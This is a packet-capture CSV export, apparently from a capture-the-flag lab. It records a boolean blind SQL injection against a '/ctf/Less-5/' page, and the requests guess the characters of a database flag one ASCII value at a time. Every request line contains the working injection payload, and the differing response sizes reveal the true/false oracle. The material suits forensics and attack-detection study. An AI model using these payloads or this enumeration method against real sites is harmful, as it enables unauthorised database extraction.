"No.","Time","Source","Destination","Protocol","Length","Info"
"3344","2.487507667","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=100--+ HTTP/1.1 "
"3347","2.489671177","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3356","2.492019371","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=101--+ HTTP/1.1 "
"3359","2.494350252","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3368","2.496915407","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=102--+ HTTP/1.1 "
"3371","2.499231156","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3380","2.501429369","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=103--+ HTTP/1.1 "
"3383","2.503743223","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"3392","2.506339090","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=33--+ HTTP/1.1 "
"3395","2.508587477","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3404","2.511125082","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=34--+ HTTP/1.1 "
"3407","2.513264736","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3416","2.515811053","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=35--+ HTTP/1.1 "
"3419","2.517781964","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3428","2.520365183","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=36--+ HTTP/1.1 "
"3431","2.522793586","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3440","2.525392659","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=37--+ HTTP/1.1 "
"3443","2.527684680","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3452","2.530352605","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=38--+ HTTP/1.1 "
"3455","2.532467608","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3464","2.536288685","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=39--+ HTTP/1.1 "
"3467","2.538439400","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3476","2.540594817","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=40--+ HTTP/1.1 "
"3479","2.542759505","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3488","2.545270831","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=41--+ HTTP/1.1 "
"3491","2.547390283","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3500","2.549889269","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=42--+ HTTP/1.1 "
"3503","2.552153316","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3512","2.554426351","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=43--+ HTTP/1.1 "
"3515","2.556493807","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3524","2.558934356","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=44--+ HTTP/1.1 "
"3527","2.561039118","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3536","2.563330552","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=45--+ HTTP/1.1 "
"3539","2.565366163","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3548","2.567498528","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=46--+ HTTP/1.1 "
"3551","2.569551527","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3560","2.571801354","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=47--+ HTTP/1.1 "
"3563","2.573941914","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3572","2.576266137","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=48--+ HTTP/1.1 "
"3575","2.578624055","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3584","2.580951319","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=49--+ HTTP/1.1 "
"3587","2.582990858","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3596","2.585388429","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=50--+ HTTP/1.1 "
"3599","2.587624801","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3608","2.590225228","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=51--+ HTTP/1.1 "
"3611","2.592476862","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3620","2.595068768","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=52--+ HTTP/1.1 "
"3623","2.597253466","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3632","2.599850427","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=53--+ HTTP/1.1 "
"3635","2.601937461","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3644","2.604364090","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=54--+ HTTP/1.1 "
"3647","2.607052379","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3656","2.609569781","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=55--+ HTTP/1.1 "
"3659","2.611792390","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3668","2.614383981","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=56--+ HTTP/1.1 "
"3671","2.616642968","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3680","2.619243102","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=57--+ HTTP/1.1 "
"3683","2.621230599","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3692","2.623818887","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=58--+ HTTP/1.1 "
"3695","2.626080004","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3704","2.628781966","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=59--+ HTTP/1.1 "
"3707","2.630898587","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3716","2.632917850","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=60--+ HTTP/1.1 "
"3719","2.635100115","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3728","2.637715153","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=61--+ HTTP/1.1 "
"3731","2.639947386","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3740","2.642580150","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=62--+ HTTP/1.1 "
"3743","2.644708607","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3752","2.647028340","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=63--+ HTTP/1.1 "
"3755","2.649031220","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3764","2.651473235","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=64--+ HTTP/1.1 "
"3767","2.653581034","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3776","2.656071576","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=65--+ HTTP/1.1 "
"3779","2.658243094","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3788","2.660439905","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=66--+ HTTP/1.1 "
"3791","2.662445021","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3800","2.664667775","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=67--+ HTTP/1.1 "
"3803","2.666763620","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3812","2.669274065","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=68--+ HTTP/1.1 "
"3815","2.671277643","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3824","2.673456583","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=69--+ HTTP/1.1 "
"3827","2.675619868","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3836","2.678021018","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=70--+ HTTP/1.1 "
"3839","2.680166883","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3848","2.682374787","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=71--+ HTTP/1.1 "
"3851","2.684440918","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3860","2.686168428","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=72--+ HTTP/1.1 "
"3863","2.688393866","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3872","2.691018611","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=73--+ HTTP/1.1 "
"3875","2.693426465","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3884","2.696009708","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=74--+ HTTP/1.1 "
"3887","2.698310411","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3896","2.701250779","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=75--+ HTTP/1.1 "
"3899","2.703507095","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3908","2.705394990","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=76--+ HTTP/1.1 "
"3911","2.707648920","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3920","2.710088824","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=77--+ HTTP/1.1 "
"3923","2.712337737","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3932","2.714935360","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=78--+ HTTP/1.1 "
"3935","2.717104830","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3944","2.719782635","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=79--+ HTTP/1.1 "
"3947","2.722057283","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3956","2.724559154","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=80--+ HTTP/1.1 "
"3959","2.726804300","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3968","2.729011230","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=81--+ HTTP/1.1 "
"3971","2.731099623","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3980","2.733224281","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=82--+ HTTP/1.1 "
"3983","2.735640705","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3992","2.738197158","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=83--+ HTTP/1.1 "
"3995","2.740295837","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4004","2.742912207","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=84--+ HTTP/1.1 "
"4007","2.745195087","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4016","2.747801520","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=85--+ HTTP/1.1 "
"4019","2.750067605","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4028","2.752334323","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=86--+ HTTP/1.1 "
"4031","2.754370239","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4040","2.756911961","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=87--+ HTTP/1.1 "
"4043","2.759032997","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4052","2.761026141","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=88--+ HTTP/1.1 "
"4055","2.763096611","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4064","2.765379383","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=89--+ HTTP/1.1 "
"4067","2.767515908","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4076","2.770012354","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=90--+ HTTP/1.1 "
"4079","2.772125478","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4088","2.775950993","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=91--+ HTTP/1.1 "
"4091","2.778004537","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4100","2.780355278","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=92--+ HTTP/1.1 "
"4103","2.782428832","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4112","2.784916635","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=93--+ HTTP/1.1 "
"4115","2.787172097","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4124","2.789373980","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=94--+ HTTP/1.1 "
"4127","2.791637248","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4136","2.794111188","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=95--+ HTTP/1.1 "
"4139","2.796358066","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4148","2.798598616","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=96--+ HTTP/1.1 "
"4151","2.800696250","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4160","2.803016276","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=97--+ HTTP/1.1 "
"4163","2.805007498","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4172","2.807505373","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=98--+ HTTP/1.1 "
"4175","2.809773362","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4184","2.812419449","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=99--+ HTTP/1.1 "
"4187","2.814605772","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4196","2.816987161","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=100--+ HTTP/1.1 "
"4199","2.819285898","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4208","2.821860402","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=101--+ HTTP/1.1 "
"4211","2.824164339","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4220","2.826798533","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=102--+ HTTP/1.1 "
"4223","2.829105010","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4232","2.831712034","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=103--+ HTTP/1.1 "
"4235","2.833843197","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4244","2.835936570","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=104--+ HTTP/1.1 "
"4247","2.838005854","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4256","2.839893329","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=105--+ HTTP/1.1 "
"4259","2.842109894","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4268","2.844329845","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=106--+ HTTP/1.1 "
"4271","2.846389457","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"4280","2.849007827","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),5,1))=107--+ HTTP/1.1 "
"4283","2.851056276","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
